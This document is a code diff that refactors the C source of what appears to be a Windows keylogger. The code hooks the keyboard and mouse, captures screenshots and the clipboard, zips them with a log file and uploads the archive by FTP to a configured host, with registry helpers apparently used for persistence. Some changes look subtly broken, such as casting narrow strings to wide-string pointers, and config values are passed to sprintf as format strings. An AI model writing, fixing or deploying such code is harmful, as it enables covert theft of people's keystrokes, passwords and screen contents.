@@ -3,6 +3,18 @@
 DWORD start_time = GetTickCount();
 int i_bmp = -1;
 
+void get_this_dir_path(char *this_dir_path)
+{
+    char this_file_path[STR_SIZE];
+    GetModuleFileNameA(NULL, this_file_path, STR_SIZE);
+
+    char *last_char = strrchr(this_file_path, '\\');
+    unsigned int len_path = (strlen(this_file_path) - strlen(last_char)) + 1;
+
+    strncpy(this_dir_path, this_file_path, len_path);
+    this_dir_path[len_path] = '\0';
+}
+
 SOCKET create_sock( char * serverHost, short serverPort )
 {
 	SOCKET Socket=INVALID_SOCKET;
@@ -12,7 +24,7 @@ SOCKET create_sock( char * serverHost, short serverPort )
 	{
 		//printf( "WSA Initialization failed! Error code: %d\n", WSAGetLastError() );
 		WSACleanup();
-		return -1;
+        return INVALID_SOCKET;
 	}
 	
 	Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
@@ -20,7 +32,7 @@ SOCKET create_sock( char * serverHost, short serverPort )
 	{
 		//printf( "Socket creation failed. Error code: %d\n", WSAGetLastError() );
 		WSACleanup();
-		return -1;
+        return INVALID_SOCKET;
 	}
 
 	// Resolve IP address for hostname
@@ -29,12 +41,12 @@ SOCKET create_sock( char * serverHost, short serverPort )
 	{
 		//printf( "Failed to resolve hostname. Error code: %d\n", WSAGetLastError() );
 		WSACleanup();
-		return -1;
+        return INVALID_SOCKET;
 	}
 
 	// Setup our socket address structure
 	SOCKADDR_IN SockAddr;
-	SockAddr.sin_port = htons( serverPort );
+    SockAddr.sin_port = htons( (u_short)serverPort );
 	SockAddr.sin_family = AF_INET;
 	SockAddr.sin_addr.s_addr = *( (unsigned long*)host->h_addr );
 
@@ -43,7 +55,7 @@ SOCKET create_sock( char * serverHost, short serverPort )
 	{
 		//printf( "Failed to establish connection with server. Error code: %d\n", WSAGetLastError() );
 		WSACleanup();
-		return -1;
+        return INVALID_SOCKET;
 	}
 
 	return Socket;
@@ -171,16 +183,16 @@ void get_registry_key( HKEY hKey, char *keyPath, char *keyName, char * reg_key )
 	long res;
 	
 	res = RegOpenKeyEx( 	hKey, 
-							keyPath, 
+                            (LPCWSTR)keyPath,
 							0, 
 							KEY_QUERY_VALUE, 
 							&rKey );
-	if ( res != ERROR_SUCCESS ) 	
+    //if ( res != ERROR_SUCCESS )
 		//printf("Error Opening Registry Key\n");
 	
 	res = RegQueryValueEx(	rKey, 
-							keyName, 
-							NULL, 
+                            (LPCWSTR)keyName,
+                            NULL,
 							&Type, 
 							keyData, 
 							&sizeData );
@@ -191,7 +203,8 @@ void get_registry_key( HKEY hKey, char *keyPath, char *keyName, char * reg_key )
 	RegCloseKey( rKey );	
 }
 
-bool set_registry_key( HKEY hKey, char *keyPath, char *keyName, char *keyData )
+bool set_registry_key( HKEY hKey, const char keyPath[],
+                       const char keyName[], char *keyData )
 {
 	HKEY rKey;
 
@@ -201,7 +214,8 @@ bool set_registry_key( HKEY hKey, char *keyPath, char *keyName, char *keyData )
 	long res;
 	
 	res = RegCreateKeyEx(	hKey, 
-							keyPath, 0, 
+                            (LPCWSTR)keyPath,
+                            0,
 							NULL, 
 							REG_OPTION_NON_VOLATILE, 
 							KEY_ALL_ACCESS, 
@@ -216,7 +230,8 @@ bool set_registry_key( HKEY hKey, char *keyPath, char *keyName, char *keyData )
 	}
 
 	res = RegSetValueEx( 	rKey, 
-							keyName, 0, 
+                            (LPCWSTR)keyName,
+                            0,
 							Type, 
 							(const unsigned char *)keyData, 
 							sizeData );
@@ -276,7 +291,7 @@ bool upload_file(	char *host,
 					char *port,
 					char *user_name,
 					char *user_pass,
-					char *ftp_dir,
+                    const char ftp_dir[],
 					char *file_name,
 					char *path_file )
 {
@@ -376,7 +391,7 @@ bool upload_file(	char *host,
 	return true;
 }
 
-void write_log(char *data)
+void write_log(const char *data)
 {
 	FILE *f = fopen(LOG_FILE, "a+");
 	if(f)
@@ -477,6 +492,7 @@ int CALLBACK keyoard_hook(int n_code, DWORD w_param, DWORD l_param)
 
 	DWORD finish_time = GetTickCount();
 	DWORD diff_time_sec = (finish_time - start_time) / 1000;
+
 	if (diff_time_sec >= INTERVAL_TIME) 
 	{
 		send_file();
@@ -491,8 +507,8 @@ LRESULT CALLBACK mouse_hook(int n_code, DWORD w_param, DWORD l_param)
 {
 	if(w_param == WM_RBUTTONDOWN || w_param == WM_LBUTTONDOWN)
 	{
-		set_clipboard();
-		change_window();
+        set_clipboard();
+        change_window();
 	}
 
 	return CallNextHookEx(NULL, n_code, w_param, l_param);
@@ -503,10 +519,11 @@ bool send_file()
 	char ho[STR_SIZE];
 	char po[STR_SIZE];
 	char lo[STR_SIZE];
-	char pa[STR_SIZE];
-	read_config( CONF_FILE, ho, po, lo, pa );
-
-	char *zip_path = ".\\";
+    char pa[STR_SIZE];
+    read_config( CONF_FILE, ho, po, lo, pa );
+//TODO path
+    char zip_path[STR_SIZE];
+    get_this_dir_path(zip_path);
 	char zip_file[STR_SIZE];
 	char zip_file_path[CMD_SIZE];
 	sprintf(zip_file, "%s%d%s", "data", _random(), ".zip");
@@ -523,16 +540,23 @@ bool send_file()
 
 void create_zip_file(char *path_zip_file, 
 					 char screen_file[N_FILES][STR_SIZE], 
-					 char *log_file)
+                     const char log_file[])
 {
-	HZIP hz = CreateZip( path_zip_file, 0 );
+    struct zip_t *zip = zip_open(path_zip_file, ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');
+    {
+        for(int i=0; i <= i_bmp; i++)
+        {
+            zip_entry_open(zip, screen_file[i]);
+            zip_entry_fwrite(zip, screen_file[i]);
+            zip_entry_close(zip);
+        }
 
-	for(int i=0; i <= i_bmp; i++)
-		ZipAdd( hz, screen_file[i],  screen_file[i] );
+        zip_entry_open(zip, log_file);
+        zip_entry_fwrite(zip, log_file);
+        zip_entry_close(zip);
 
-	ZipAdd( hz, log_file,  log_file );
-	
-	CloseZip( hz );	
+    }
+    zip_close(zip);
 
 	for(int i=0; i <= i_bmp; i++)
 		remove( screen_file[i] );
@@ -544,7 +568,7 @@ void create_zip_file(char *path_zip_file,
 
 bool copy_file(char *src_file_path, char *dst_file_path)
 {
-	FILE *src_file = fopen(src_file_path, "rb");
+    FILE *src_file = fopen(src_file_path, "rb");
 	if(!src_file)
 	{
 		return false;
@@ -571,7 +595,7 @@ bool copy_file(char *src_file_path, char *dst_file_path)
 	return true;
 }
 
-bool read_config(	char *config,
+bool read_config(	const char config[80],
 					char *host,
 					char *port,
 					char *login,
@@ -585,32 +609,52 @@ bool read_config(	char *config,
 	}
 	
 	char str[STR_SIZE];
-
+#define LF 0x0a
 	while( fgets(str, STR_SIZE, file) )
 	{
 		if( strstr(str, "host") != NULL )
 		{	
 			strtok(str, " :"); 
 			sprintf(host, strtok(NULL, " :"));
-			host[strlen(host)-1] = '\0';
+            if(host[strlen(host)-1]==LF)
+            {
+                host[strlen(host)-1] = '\0';
+            } else {
+                host[strlen(host)] = '\0';
+            }
 		}
 		else if( strstr(str, "port") != NULL )
 		{	
 			strtok(str, " :"); 
 			sprintf(port, strtok(NULL, " :"));
-			port[strlen(port)-1] = '\0';
+            if(port[strlen(port)-1]==LF)
+            {
+                port[strlen(port)-1] = '\0';
+            } else {
+                port[strlen(port)] = '\0';
+            }
 		}
 		else if( strstr(str, "login") != NULL )
 		{	
 			strtok(str, " :"); 
 			sprintf(login, strtok(NULL, " :"));
-			login[strlen(login)-1] = '\0';
+            if(login[strlen(login)-1]==LF)
+            {
+                login[strlen(login)-1] = '\0';
+            } else {
+                login[strlen(login)] = '\0';
+            }
 		}
 		else if( strstr(str, "password") != NULL )
 		{	
 			strtok(str, " :"); 
 			sprintf(password, strtok(NULL, " :"));
-			password[strlen(password)-1] = '\0';
+            if(password[strlen(password)-1]==LF)
+            {
+                password[strlen(password)-1] = '\0';
+            } else {
+                password[strlen(password)] = '\0';
+            }
 		}
 	}
 	return true;
